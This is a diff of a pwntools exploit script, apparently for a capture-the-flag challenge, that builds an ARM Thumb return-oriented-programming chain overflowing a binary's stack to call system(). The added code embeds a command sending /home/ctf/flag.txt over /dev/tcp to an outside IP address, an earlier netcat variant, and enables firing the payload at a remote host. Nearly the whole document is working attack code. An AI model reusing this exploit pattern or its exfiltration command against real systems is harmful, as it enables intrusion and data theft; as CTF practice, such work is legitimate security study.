@@ -8,6 +8,8 @@ context.binary = "./main_fixed"
 # rops
 rop_r1_t_adr = 0x0003777e # ; pop {r1, pc} !thumb
 rop_mov_r0_r6_t_adr = 0x00010d2c  # ; mov r0,r6 / pop {r4, r5, r6, pc}
+rop_add_r0_r4_t_adr = 0x0001fd74  # ; add r0, r4 / pop {r4, pc}
+rop_mov_r0_r6_wr3_t_adr = 0x00010c2a  # ; mov r0, r6 ; pop {r3, r4, r5, r6, r7, pc}
 
 rop_add_sp_0xc_t_adr = 0x00014532  # ; add sp,#0xc / pop {r4, r5, pc}
 rop_add_sp_0x28_t_adr = 0x00040380  # ; add sp, #0x28 / pop {r4, pc}
@@ -17,12 +19,16 @@ rop_pop_lr_t_adr = 0x00045f5a  # ; pop.w {r4, lr} / nop.w / pop {r4, pc}
 
 rop_mov_r0_r1_t_adr = 0x00022fde  # ; mov r0 r1 / bx lr
 
+rop_ror_r0_t_adr = 0x0001db28  # ; rors r0, r6 / bx r3
+
 rop_open_t_adr = 0x00021dac  # open
 rop_system_t_adr = 0x00014c10  # system
 rop_sice_t_adr = 0x00010424  # sice
 rop_continue_main_t_adr = 0x000104be  # main cont
+rop_exit_t_adr = 0x00014358  # exit fkt
 
 rop_set_r0_t_adr = 0x00034f6c  # ; pop {r0, r6, pc}
+rop_set_r3_t_adr = 0x00014c28  # ; pop {r3, pc}
 
 location_bin_sh = 0x0004b004  # string "/bin/sh"
 location_date = 0x0004ab60  # string "date +'%s'"
@@ -71,12 +77,17 @@ How the rop chain works:
 
 """
 
+def build_add_r0_r4_t(r4=0):
+    payload = p32(rop_add_r0_r4_t_adr + 1)
+    payload += p32(r4)
+    return payload
+
 def build_lr(lr, r4=0):
     payload = p32(rop_pop_lr_t_adr + 1)
     payload += p32(0) + p32(lr) + p32(r4)
     return payload
 
-def build_mov_r0_r6_t(r4, r5, r6):
+def build_mov_r0_r6_t(r4=0, r5=0, r6=0):
     payload = p32(rop_mov_r0_r6_t_adr + 1)
     payload += p32(r4) + p32(r5) + p32(r6)
     return payload
@@ -99,90 +110,81 @@ def build_set_r0(r0, r6):
 
 
 if True:
-    tty_path = b"/dev/tty\x00"
-    #tty_path = f"/dev/pts/{sys.argv[1]}\x00".encode("ascii")
-    #print(f"using {tty_path}")
+    addr = "128.140.44.15"
+    initial = "ls"
+    server = f"nc {addr} 8337"
+
+    cmd = initial + "|" + server
+    cmd = f"bash -c \"cat /home/ctf/flag.txt >/dev/tcp/{addr}/8337\""
+    print("cmd:", cmd)
+    cmd = cmd.encode("ascii")
 
     payload = b"0" * 0x20
     payload += b"1" * 4
 
     # trying to execute rop_r1_t_adr in thumb mode
-    payload += p32(rop_r1_t_adr + 1)
-    # write to r1
-    payload += p32(os.O_RDWR)
-
     # move r6 to r0
-    payload += build_mov_r0_r6_t(0, 0, 0)
+    payload += build_mov_r0_r6_t(r4=40, r6=8)
+    payload += build_add_r0_r4_t()
 
-    payload += p32(rop_add_sp_0x28_t_adr + 1)
-    prev_len = len(payload)
 
-    payload += b"0" * (40 - (len(payload) - 0x20))
-    payload += tty_path
-    payload += b"0" * ((prev_len + 0x28) - len(payload) + 4)
+    if False:  # set exit code manually
+        payload += build_lr(rop_set_r0_t_adr + 1)
+        payload += p32(rop_system_t_adr + 1)
 
-    payload += p32(rop_add_sp_0x14_t_adr + 1)
-    payload += b"0" * 0x14
-    payload += b"0" * (4 * 2)  # for add sp (2 args)
+        payload += p32(0) + p32(0)
+        payload += p32(rop_exit_t_adr + 1)
+    elif False:  # return value is error code from system
+        payload += build_lr(rop_set_r3_t_adr + 1)
+        payload += p32(rop_system_t_adr + 1)
 
-    # do open
-    payload += call_open_t(rop_add_sp_0x14_t_adr + 1)
-    payload += b"0" * 0x14
-    payload += b"0" * (4 * 2)  # for add sp (2 args)
+        payload += p32(rop_exit_t_adr + 1)
+        payload += p32(rop_ror_r0_t_adr + 1)
+    else:
+        payload += build_lr(rop_set_r3_t_adr + 1)
+        payload += p32(rop_system_t_adr + 1)
 
-    # move r1 to r0 and set r1 = O_RDRW
-    payload += mov_r0_r1_t(rop_r1_t_adr + 1)
-    payload += p32(os.O_WRONLY)
+        rop_mov_r1_r0_t_adr = 0x0001eb0e  # ; movs r1, r0 / bx lr
+        rop_add_r1_r3_b_t_adr = 0x0003de3e  # add r1, r3 / blx r1
 
-    # do open v2
-    #payload += call_open_t(rop_add_sp_0x14_t_adr + 1)
-    #payload += b"0" * 0x14
-    #payload += b"0" * (4 * 2)  # for add sp (2 args)
-    #payload += mov_r0_r1_t(rop_r1_t_adr + 1)
-    #payload += p32(os.O_WRONLY)
+        payload += p32(rop_set_r3_t_adr + 1)
+        payload += p32(rop_ror_r0_t_adr + 1)
+        payload += p32(rop_exit_t_adr + 1)
+        payload += p32(rop_pop_lr_t_adr + 1)
+        payload += p32(0) + p32(rop_add_r1_r3_b_t_adr + 1) + p32(0)
+        payload += p32(rop_mov_r1_r0_t_adr + 1)
 
-    # payload += call_open_t(rop_add_sp_0x28_t_adr + 1)
-    # # open uses 16bytes of stack, reserve it
-    # payload += b"0" * 0x28
-    # payload += b"0" * (4)  # for add sp (2 args)
 
-    # payload += mov_r0_r1_t(rop_r1_t_adr + 1)
-    # payload += p32(os.O_WRONLY)
 
-    payload += call_open_t(rop_add_sp_0x14_t_adr + 1)
-    # open uses 16bytes of stack, reserve it
-    payload += b"0" * 0x14
-    payload += b"0" * (4 * 2)  # for add sp (two args)
-
-    # NOW WE CAN USE ROP TO CALL SYSTEM !!!!!!! (I'm so tired)
-    payload += build_set_r0(location_bin_sh, 0)
-    payload += build_lr(rop_continue_main_t_adr + 1)
-    payload += p32(rop_sice_t_adr + 1)
     print(len(payload))
+
+    payload += b"0" * ((40 + 40) - (len(payload) - 0x20))
+    payload += cmd + b"\x00"
 
     print(f"Payload Length: {len(payload)}")
 
     assert(len(payload) < 340)
 else:
+    ...
     payload = b"0" * 0x192
     # with 0x200 bytes calls to system don't resolve
     ...
 with open("/local-tmp/payload", "bw") as fp:
     fp.write(payload)
 
-if False:
+if True:
     r = remote("34.125.56.151", 2222, ssl=False)
     r.sendline(payload)
     r.interactive()
     exit()
 
-io = gdb.debug(context.binary.path, gdbscript="""
-source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
-b *0x00021dac
-b *0x010488
-b *0x00014c10
-c
-""")
-#io = process(context.binary.path, stdin=PTY)
+#io = gdb.debug(context.binary.path, gdbscript="""
+#source /home/elizabeth/Documents/Projects/ccc/ctfriday-bsidesindore23/pwndbg/gdbinit.py
+#b *0x00021dac
+#b *0x010488
+#b *0x00014c10
+#c
+#""")
+io = process(context.binary.path)
 io.sendline(payload)
 io.interactive()
